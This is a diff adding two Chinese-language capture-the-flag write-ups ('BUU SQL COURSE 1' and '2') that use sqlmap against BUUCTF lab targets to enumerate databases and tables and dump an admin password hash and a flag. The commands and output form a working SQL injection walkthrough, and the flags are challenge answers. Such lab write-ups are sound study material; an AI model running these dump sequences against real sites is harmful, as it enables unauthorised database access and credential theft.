@@ -2149,6 +2149,107 @@ flag{3268a104-6cc6-4efe-b09e-600ce18dc594}
 
 ------
 
+### BUU SQL COURSE 1
+
+打开靶机后，发现这是一个有登录入口的新闻网。`F11`调试选中`Network`，发现点击测试新闻1的时候，靶机请求了链接`content_detail.php?id=1`，右键`Copy URL`。
+
+尝试用`sqlmap`爆破。
+
+```bash
+$ sqlmap -u "http://024208c1-bb77-4eda-9a40-90f9e73372e7.node5.buuoj.cn:81/backend/content_detail.php?id=1" --current-db
+......
+current database: 'news'
+
+$ sqlmap -u "http://024208c1-bb77-4eda-9a40-90f9e73372e7.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D news --tables
+......
+Database: news
+[2 tables]
++----------+
+| admin    |
+| contents |
++----------+
+
+$ sqlmap -u "http://024208c1-bb77-4eda-9a40-90f9e73372e7.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D news -T admin --columns
+......
+Database: news
+Table: admin
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| password | varchar(128) |
+| username | varchar(128) |
++----------+--------------+
+
+$ sqlmap -u "http://024208c1-bb77-4eda-9a40-90f9e73372e7.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D news -T admin -C password --dump
+......
+Database: news
+Table: admin
+[1 entry]
++----------------------------------+
+| password                         |
++----------------------------------+
+| 40724d0c4062f57ca481bd6998bc3893 |
++----------------------------------+
+```
+
+将账号`admin`和密码`40724d0c4062f57ca481bd6998bc3893`在登录界面输入，弹出提示框就是需要提交的`flag`。
+
+------
+
+### BUU SQL COURSE 2
+
+打开靶机后发现和上一题的界面相似，先直接用上面的方法尝试，`sqlmap`爆破获取`admin`的密码后在登录界面输入，弹出提示框`false`，继续用`sqlmap`尝试，直接寻找有`flag`的数据库。
+
+```bash
+$ sqlmap -u "http://326fb339-dd1d-4c96-a7c0-a329b0043102.node5.buuoj.cn:81/backend/content_detail.php?id=1" --dbs
+......
+available databases [6]:
+[*] ctftraining
+[*] information_schema
+[*] mysql
+[*] news
+[*] performance_schema
+[*] test
+
+$ sqlmap -u "http://326fb339-dd1d-4c96-a7c0-a329b0043102.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D ctftraining --tables
+......
+Database: ctftraining
+[3 tables]
++-------+
+| flag  |
+| news  |
+| users |
++-------+
+
+$ sqlmap -u "http://326fb339-dd1d-4c96-a7c0-a329b0043102.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D ctftraining -T flag --columns
+......
+Database: ctftraining
+Table: flag
+[1 column]
++--------+-----------+
+| Column | Type      |
++--------+-----------+
+| flag   | char(128) |
++--------+-----------+
+
+$ sqlmap -u "http://326fb339-dd1d-4c96-a7c0-a329b0043102.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D ctftraining -T flag -C flag --dump
+......
+Database: ctftraining
+Table: flag
+[1 entry]
++--------------------------------------------+
+| flag                                       |
++--------------------------------------------+
+| flag{6bc5f3fb-c3b2-4ed5-be7d-d6c6bc112713} |
++--------------------------------------------+
+```
+
+提交`flag`即可。
+
+------
+
 ## PwnTheBox
 
 ### [XSS](https://ce.pwnthebox.com/challenges?type=5&id=673)
